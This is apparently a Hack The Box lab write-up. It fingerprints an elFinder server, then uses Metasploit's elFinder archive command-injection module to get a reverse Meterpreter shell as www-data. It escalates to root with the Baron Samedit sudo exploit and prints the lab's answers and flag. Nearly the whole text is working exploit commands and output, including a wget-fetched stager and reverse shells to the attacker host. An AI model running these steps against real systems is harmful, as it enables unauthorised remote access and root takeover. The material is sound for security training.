## The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?
```
$ whatweb 10.129.203.52
http://10.129.203.52 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.203.52], Script, Title[elFinder 2.1.x source version with PHP connector], X-UA-Compatible[IE=edge]

```
The answer is : 
> ==ElFinder==

## Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

```
msf6 > search elfinder

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection


Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection

msf6 > use 3
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > options

Module options (exploit/linux/http/elfinder_archive_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The URI of elFinder
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to li
                                       sten on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set lhost tun0
lhost => 10.10.14.186
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set rhosts 10.129.203.52
rhosts => 10.129.203.52

msf6 exploit(linux/http/elfinder_archive_cmd_injection) > run

[*] Started reverse TCP handler on 10.10.14.186:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. elFinder running version 2.1.53
[*] Uploading file sxvhAWhqe.txt to elFinder
[+] Text file was successfully uploaded!
[*] Attempting to create archive JjEcaes.zip
[+] Archive was successfully created!
[*] Using URL: http://10.10.14.186:8080/xisOUi
[*] Client 10.129.203.52 (Wget/1.20.3 (linux-gnu)) requested /xisOUi
[*] Sending payload to 10.129.203.52 (Wget/1.20.3 (linux-gnu))
[*] Command Stager progress -  50.00% done (54/108 bytes)
[*] Command Stager progress -  70.37% done (76/108 bytes)
[*] Sending stage (1017704 bytes) to 10.129.203.52
[+] Deleted sxvhAWhqe.txt
[+] Deleted JjEcaes.zip
[*] Meterpreter session 1 opened (10.10.14.186:4444 -> 10.129.203.52:35486) at 2024-05-20 10:33:08 -0300
[*] Command Stager progress -  82.41% done (89/108 bytes)
[*] Command Stager progress - 100.00% done (108/108 bytes)
[*] Server stopped.

meterpreter > getuid 
]Server username: www-data

```

The answer is : 
> ==www-data==

## The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.

```
meterpreter > shell
Process 1402 created.
Channel 1 created.
cat /etc/shells
# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
/usr/bin/screen
/bin/bash -i
bash: cannot set terminal process group (1015): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nix02:~/html/files$ sudo -V
sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```


```
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > search sudo 1.8

Matching Modules
================

   #   Name                                                                    Disclosure Date  Rank       Check  Description
   -   ----                                                                    ---------------  ----       -----  -----------
   0   exploit/linux/local/sudo_baron_samedit                                  2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow
   1     \_ target: Automatic                                                  .                .          .      .
   2     \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)                .                .          .      .
   3     \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31) - alternative  .                .          .      .
   4     \_ target: Ubuntu 19.04 x64 (sudo v1.8.27, libc v2.29)                .                .          .      .
   5     \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27)                .                .          .      .
   6     \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27) - alternative  .                .          .      .
   7     \_ target: Ubuntu 16.04 x64 (sudo v1.8.16, libc v2.23)                .                .          .      .
   8     \_ target: Ubuntu 14.04 x64 (sudo v1.8.9p5, libc v2.19)               .                .          .      .
   9     \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28)                   .                .          .      .
   10    \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28) - alternative     .                .          .      .
   11    \_ target: CentOS 8 x64 (sudo v1.8.25p1, libc v2.28)                  .                .          .      .
   12    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17)                    .                .          .      .
   13    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17) - alternative      .                .          .      .
   14    \_ target: Fedora 27 x64 (sudo v1.8.21p2, libc v2.26)                 .                .          .      .
   15    \_ target: Fedora 26 x64 (sudo v1.8.20p2, libc v2.25)                 .                .          .      .
   16    \_ target: Fedora 25 x64 (sudo v1.8.18, libc v2.24)                   .                .          .      .
   17    \_ target: Fedora 24 x64 (sudo v1.8.16, libc v2.23)                   .                .          .      .
   18    \_ target: Fedora 23 x64 (sudo v1.8.14p3, libc v2.22)                 .                .          .      .
   19    \_ target: Manual                                                     .                .          .      .
   20  exploit/linux/local/sudoedit_bypass_priv_esc                            2023-01-18       excellent  Yes    Sudoedit Extra Arguments Priv Esc
   21  exploit/linux/ssh/vyos_restricted_shell_privesc                         2018-11-05       great      Yes    VyOS restricted-shell Escape and Privilege Escalation


Interact with a module by name or index. For example info 21, use 21 or use exploit/linux/ssh/vyos_restricted_shell_privesc

msf6 exploit(linux/http/elfinder_archive_cmd_injection) >  use exploit/linux/local/sudo_baron_samedit

msf6 exploit(linux/local/sudo_baron_samedit) > set lhost tun0
lhost => 10.10.14.186
msf6 exploit(linux/local/sudo_baron_samedit) > set session 1
session => 1

msf6 exploit(linux/local/sudo_baron_samedit) > run

[*] Started reverse TCP handler on 10.10.14.186:4444 
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: x86
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
[*] Writing '/tmp/IXM4mUmVH.py' (763 bytes) ...
[*] Writing '/tmp/libnss_4F/mbEu .so.2' (548 bytes) ...
[*] Sending stage (3045380 bytes) to 10.129.203.52
[+] Deleted /tmp/IXM4mUmVH.py
[+] Deleted /tmp/libnss_4F/mbEu .so.2
[+] Deleted /tmp/libnss_4F
[*] Meterpreter session 2 opened (10.10.14.186:4444 -> 10.129.203.52:35964) at 2024-05-20 11:12:08 -0300

meterpreter > getuid 
Server username: root

meterpreter > ls /root/
Listing: /root/
===============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100600/rw-------  178    fil   2022-05-16 12:35:30 -0300  .bash_history
100644/rw-r--r--  3106   fil   2022-05-16 12:34:51 -0300  .bashrc
040700/rwx------  4096   dir   2022-05-16 10:46:07 -0300  .cache
040700/rwx------  4096   dir   2022-05-16 10:46:06 -0300  .config
040755/rwxr-xr-x  4096   dir   2022-05-16 10:46:07 -0300  .local
100644/rw-r--r--  161    fil   2019-12-05 11:39:21 -0300  .profile
100644/rw-r--r--  75     fil   2022-05-16 05:45:33 -0300  .selected_editor
040700/rwx------  4096   dir   2021-10-06 14:37:09 -0300  .ssh
100600/rw-------  13300  fil   2022-05-16 12:34:51 -0300  .viminfo
100644/rw-r--r--  291    fil   2022-05-16 10:51:29 -0300  .wget-hsts
100644/rw-r--r--  24     fil   2022-05-16 12:18:40 -0300  flag.txt
040755/rwxr-xr-x  4096   dir   2021-10-06 14:37:19 -0300  snap

meterpreter > cat /root/flag.txt 
HTB{5e55ion5_4r3_sw33t}
```
The answer is : 
> ==HTB{5e55ion5_4r3_sw33t}==